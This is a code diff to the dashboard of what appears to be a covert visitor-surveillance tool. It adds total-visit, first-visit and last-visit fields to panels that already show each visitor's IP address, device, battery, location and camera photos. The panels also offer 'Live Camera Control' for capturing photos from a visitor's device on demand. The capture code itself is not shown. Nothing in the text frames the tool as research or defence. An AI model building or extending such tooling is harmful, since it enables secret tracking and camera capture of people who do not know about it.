@@ -106,6 +106,7 @@ function displayVisitors(visitors) {
                     <div style="font-size:14px; color:#666; margin-top:5px;">
                         📱 ${visitor.deviceName || 'Unknown'} 
                         ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
+                        ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
                     </div>
                     ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                     ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
@@ -139,7 +140,7 @@ function showVisitorDetails(visitorId) {
             
             let html = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
-                    <!-- LEFT COLUMN: Visitor Info -->
+                    <!-- LEFT COLUMN -->
                     <div>
                         <h3>👤 Visitor Information</h3>
                         <div class="visitor-details-grid">
@@ -148,7 +149,9 @@ function showVisitorDetails(visitorId) {
                             <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visitor.ip || 'N/A'}</div></div>
                             <div class="detail-card"><label>📶 Network</label><div class="value">${visitor.network?.effectiveType || visitor.network?.type || 'N/A'}</div></div>
                             <div class="detail-card"><label>🔋 Battery</label><div class="value">${visitor.battery || 'N/A'}%</div></div>
-                            <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'N/A'}</div></div>
+                            <div class="detail-card"><label>📅 First Visit</label><div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'N/A'}</div></div>
+                            <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${visitor.totalVisits || 0}</div></div>
+                            <div class="detail-card"><label>📅 Last Visit</label><div class="value">${visitor.lastVisit ? new Date(visitor.lastVisit).toLocaleString() : 'N/A'}</div></div>
                             <div class="detail-card"><label>🟢 Status</label><div class="value">${visitor.connected ? 'Online' : 'Offline'}</div></div>
                         </div>
                     </div>
@@ -165,7 +168,7 @@ function showVisitorDetails(visitorId) {
                             </div>
                         ` : '<p style="color:#999;">Location not available</p>'}
                         
-                        <!-- PHOTOS WITH DOWNLOAD -->
+                        <!-- PHOTOS -->
                         <h3 style="margin-top:20px;">📸 Photos</h3>
                         <div style="display:flex; gap:20px; flex-wrap:wrap;">
                             ${visitor.frontCamera ? `
@@ -193,7 +196,7 @@ function showVisitorDetails(visitorId) {
                             ` : '<p style="color:#999;">No back photo</p>'}
                         </div>
                         
-                        <!-- LIVE CAPTURE CONTROLS -->
+                        <!-- LIVE CAPTURE -->
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
                             <h3>📸 Live Camera Control</h3>
                             <p style="font-size:13px; color:#666; margin-bottom:10px;">Click to capture photo from visitor's device</p>
@@ -218,7 +221,7 @@ function showVisitorDetails(visitorId) {
 }
 
 // ============================================
-// CAPTURE VISITOR PHOTO (LIVE)
+// CAPTURE VISITOR PHOTO
 // ============================================
 function captureVisitorPhoto(type) {
     if (!currentVisitorId) {
